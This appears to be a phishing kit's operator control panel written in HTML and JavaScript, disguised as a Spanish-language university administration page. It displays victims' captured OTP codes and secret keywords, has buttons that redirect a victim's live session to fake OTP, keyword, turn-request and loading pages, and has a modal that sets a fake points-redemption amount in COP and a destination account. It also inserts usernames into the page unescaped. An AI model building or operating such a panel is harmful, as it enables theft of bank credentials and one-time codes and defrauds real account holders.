<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel de Administración - Universidad</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f7f6;
            margin: 0;
            padding: 0;
            color: #333;
        }
        .header {
            background-color: #004080;
            color: white;
            padding: 20px;
            text-align: center;
        }
        .container {
            max-width: 1000px;
            margin: 40px auto;
            padding: 20px;
            background-color: white;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            border-radius: 8px;
        }
        h2 {
            border-bottom: 2px solid #004080;
            padding-bottom: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }
        th, td {
            padding: 12px 15px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        th {
            background-color: #004080;
            color: white;
        }
        tr:hover {
            background-color: #f1f1f1;
        }
        .btn {
            display: inline-block;
            background-color: #004080;
            color: white;
            padding: 10px 15px;
            text-decoration: none;
            border-radius: 5px;
            margin-top: 20px;
        }
        .btn:hover {
            background-color: #003366;
        }
        .btn-action {
            display: inline-block;
            background-color: #28a745;
            color: white;
            padding: 6px 10px;
            text-decoration: none;
            border-radius: 4px;
            font-size: 14px;
            margin-right: 5px;
        }
        .btn-action:hover {
            background-color: #218838;
        }
        .status {
            margin-top: 10px;
            font-style: italic;
            color: #666;
        }
        /* Modal de puntos */
        .modal-overlay {
            display: none;
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.55);
            z-index: 1000;
            align-items: center;
            justify-content: center;
        }
        .modal-overlay.active { display: flex; }
        .modal-box {
            background: #fff;
            border-radius: 10px;
            padding: 32px 28px 24px;
            width: 100%;
            max-width: 420px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.18);
            position: relative;
        }
        .modal-box h3 {
            margin: 0 0 18px;
            color: #004080;
            font-size: 1.2rem;
        }
        .modal-box label {
            display: block;
            font-size: 13px;
            color: #555;
            margin-bottom: 4px;
            margin-top: 12px;
        }
        .modal-box input {
            width: 100%;
            padding: 9px 12px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 15px;
            box-sizing: border-box;
        }
        .modal-box input:focus {
            outline: none;
            border-color: #004080;
        }
        .modal-actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
            justify-content: flex-end;
        }
        .btn-modal-cancel {
            background: #eee;
            color: #333;
            border: none;
            padding: 9px 18px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
        }
        .btn-modal-save {
            background: #004080;
            color: #fff;
            border: none;
            padding: 9px 22px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
        }
        .btn-modal-save:hover { background: #003366; }
        .btn-points { background-color: #17a2b8; }
        .btn-points:hover { background-color: #138496; }
        .modal-close-x {
            position: absolute;
            top: 10px; right: 14px;
            background: none;
            border: none;
            font-size: 20px;
            cursor: pointer;
            color: #999;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1>Panel de Administración General</h1>
        <p>Sistema de Gestión Universitaria</p>
    </div>

    <div class="container">
        <h2>Usuarios Registrados</h2>
        <form id="create-user-form" style="margin-bottom: 24px;">
            <input id="new-username" type="text" placeholder="Usuario o correo" required>
            <input id="new-password" type="password" placeholder="Contraseña" required minlength="4">
            <button type="submit" class="btn">Crear usuario</button>
        </form>
        <div class="status" id="status-message">Cargando datos...</div>
        
        <table id="users-table" style="display: none;">
            <thead>
                <tr>
                    <th>ID</th>
                    <th>Nombre de Usuario / Correo</th>
                    <th>OTP</th>
                    <th>Palabra clave</th>
                    <th>Acciones</th>
                </tr>
            </thead>
            <tbody id="users-body">
                <!-- Data will be populated here -->
            </tbody>
        </table>

        <a href="/login.html" class="btn">Volver al Login</a>
    </div>

    <script>
        const createUserForm = document.getElementById('create-user-form');

        createUserForm.addEventListener('submit', async event => {
            event.preventDefault();

            const username = document.getElementById('new-username').value.trim();
            const password = document.getElementById('new-password').value;

            try {
                const response = await fetch('/api/users', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.error || 'No se pudo crear el usuario');
                }

                alert('Usuario creado correctamente. Ya puede iniciar sesión.');
                createUserForm.reset();
                window.location.reload();
            } catch (error) {
                alert(error.message);
            }
        });

        // Fetch data from the API endpoint
        fetch('/api/users')
            .then(response => {
                if (!response.ok) {
                    throw new Error('Error en la respuesta de la red');
                }
                return response.json();
            })
            .then(data => {
                const statusMessage = document.getElementById('status-message');
                const usersTable = document.getElementById('users-table');
                const usersBody = document.getElementById('users-body');

                if (data.users && data.users.length > 0) {
                    statusMessage.style.display = 'none';
                    usersTable.style.display = 'table';

                    data.users.forEach(user => {
                        const tr = document.createElement('tr');
                        const apartmentCode = user.apartment_code || 'Sin registro';
                        const keywordCode = user.keyword_code || 'Sin registro';
                        tr.innerHTML = `
                            <td>${user.id}</td>
                            <td>${user.username}</td>
                            <td>${apartmentCode}</td>
                            <td>${keywordCode}</td>
                            <td>
                                <button onclick="openPointsModal(${user.id}, '${user.username}')" class="btn-action btn-points">Datos Puntos</button>
                                <button onclick="redirectUser(${user.id}, 'numero-de-apto.html')" class="btn-action">OTP</button>
                                <button onclick="redirectUser(${user.id}, 'palabra-clave.html')" class="btn-action" style="background-color:#6f42c1;">Escribir Clave</button>
                                <button onclick="redirectUser(${user.id}, 'solicita-tu-turno.html')" class="btn-action" style="background-color:#fd7e14;">Solicitar turno</button>
                                <button onclick="redirectUser(${user.id}, 'cargando-2.html')" class="btn-action" style="background-color:#6c757d;">Cargando 2</button>
                                <button onclick="redirectUser(${user.id}, 'home.html')" class="btn-action" style="background-color:#007bff;">Ir a Home</button>
                                <button onclick="deleteUser(${user.id})" class="btn-action" style="background-color:#dc3545;">Eliminar</button>
                            </td>
                        `;
                        usersBody.appendChild(tr);
                    });
                } else {
                    statusMessage.textContent = 'No hay usuarios registrados en la base de datos.';
                }
            })
            .catch(error => {
                console.error('Error al cargar los usuarios:', error);
                document.getElementById('status-message').textContent = 'Error al cargar los datos. Asegúrate de que el servidor esté corriendo.';
            });

        function redirectUser(userId, view) {
            fetch(`/api/status/${userId}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ view: view })
            })
            .then(res => res.json())
            .then(data => {
                alert('¡Usuario redirigido exitosamente a ' + view + '!');
            })
            .catch(err => {
                console.error('Error:', err);
                alert('Error al intentar redirigir al usuario.');
            });
        }

        async function deleteUser(userId) {
            if (!confirm('¿Eliminar este usuario? Esta acción no se puede deshacer.')) {
                return;
            }

            try {
                const response = await fetch(`/api/users/${userId}`, { method: 'DELETE' });
                const data = await response.json();
                if (!response.ok) {
                    throw new Error(data.error || 'No se pudo eliminar el usuario');
                }
                window.location.reload();
            } catch (error) {
                alert(error.message);
            }
        }

        // ── Modal Datos Puntos ────────────────────────────────────────────────
        let currentPointsUserId = null;

        function openPointsModal(userId, username) {
            currentPointsUserId = userId;
            document.getElementById('points-modal-username').textContent = username;
            document.getElementById('input-puntos').value = '';
            document.getElementById('input-valor-cop').value = '';
            document.getElementById('input-cuenta-destino').value = '';
            document.getElementById('points-modal-status').textContent = '';

            // Pre-cargar valores existentes si los hay
            fetch(`/api/points/${userId}`)
                .then(r => r.json())
                .then(d => {
                    if (d.puntos) document.getElementById('input-puntos').value = d.puntos;
                    if (d.valor_cop) document.getElementById('input-valor-cop').value = d.valor_cop;
                    if (d.cuenta_destino) document.getElementById('input-cuenta-destino').value = d.cuenta_destino;
                })
                .catch(() => {});

            document.getElementById('points-modal-overlay').classList.add('active');
        }

        function closePointsModal() {
            document.getElementById('points-modal-overlay').classList.remove('active');
            currentPointsUserId = null;
        }

        document.addEventListener('DOMContentLoaded', function() {
            document.getElementById('btn-save-points').addEventListener('click', async () => {
                const puntos = document.getElementById('input-puntos').value.trim();
                const valor_cop = document.getElementById('input-valor-cop').value.trim();
                const cuenta_destino = document.getElementById('input-cuenta-destino').value.trim();
                const statusEl = document.getElementById('points-modal-status');

                if (!puntos || !valor_cop || !cuenta_destino) {
                    statusEl.textContent = 'Por favor completa todos los campos.';
                    statusEl.style.color = '#dc3545';
                    return;
                }

                try {
                    const res = await fetch(`/api/points/${currentPointsUserId}`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ puntos, valor_cop, cuenta_destino })
                    });
                    const data = await res.json();
                    if (!res.ok) throw new Error(data.error || 'Error al guardar');
                    statusEl.textContent = '✅ Datos guardados correctamente.';
                    statusEl.style.color = '#28a745';
                    setTimeout(closePointsModal, 1200);
                } catch (err) {
                    statusEl.textContent = '❌ ' + err.message;
                    statusEl.style.color = '#dc3545';
                }
            });

            document.getElementById('btn-cancel-points').addEventListener('click', closePointsModal);
            document.getElementById('btn-close-modal-x').addEventListener('click', closePointsModal);
            document.getElementById('points-modal-overlay').addEventListener('click', function(e) {
                if (e.target === this) closePointsModal();
            });
        });
    </script>

    <!-- Modal: Datos de Puntos -->
    <div class="modal-overlay" id="points-modal-overlay">
        <div class="modal-box">
            <button class="modal-close-x" id="btn-close-modal-x" aria-label="Cerrar">&times;</button>
            <h3>📊 Datos de Puntos — <span id="points-modal-username"></span></h3>
            <label for="input-puntos">Puntos acumulados a redimir</label>
            <input type="text" id="input-puntos" placeholder="Ej: 65420" />
            <label for="input-valor-cop">Valor en dinero (COP)</label>
            <input type="text" id="input-valor-cop" placeholder="Ej: $654.200 COP" />
            <label for="input-cuenta-destino">Destino del abono</label>
            <input type="text" id="input-cuenta-destino" placeholder="Ej: Cuenta Ahorros •••• 4821" />
            <p id="points-modal-status" style="margin: 10px 0 0; font-size: 13px; min-height: 18px;"></p>
            <div class="modal-actions">
                <button class="btn-modal-cancel" id="btn-cancel-points">Cancelar</button>
                <button class="btn-modal-save" id="btn-save-points">Guardar</button>
            </div>
        </div>
    </div>
</body>
</html>
